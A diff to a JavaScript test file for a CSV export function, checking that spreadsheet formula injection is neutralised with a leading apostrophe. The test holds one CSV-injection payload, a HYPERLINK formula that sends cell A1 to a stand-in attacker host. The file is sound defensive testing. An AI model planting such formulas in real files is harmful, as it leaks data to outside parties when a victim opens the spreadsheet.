@@ -11,14 +11,14 @@ const JANE = buildSubject("jane.doe@example.com");
 // ---- the security control, not the formatting ------------------------------------
 // Every value here was written by whoever assembled the dump. A spreadsheet runs a cell
 // beginning = + - @ as a FORMULA, and formulas can call out to a URL. An export that
-// passes one through fires it when the analyst opens the file — delivered by the tool
+// passes one through fires it when the analyst opens the file, delivered by the tool
 // they were using to investigate it.
 
 test("a value that would run as a formula is neutralised, not altered", () => {
   const payload = '=HYPERLINK("http://attacker/"&A1,"open")';
   const out = csvField(payload);
   assert.ok(out.startsWith(`"'=`), "forced to text with a leading apostrophe");
-  assert.ok(out.includes("attacker"), "and the value itself is preserved — this is evidence");
+  assert.ok(out.includes("attacker"), "and the value itself is preserved, this is evidence");
 });
 
 test("every character a spreadsheet treats as a formula start is caught", () => {
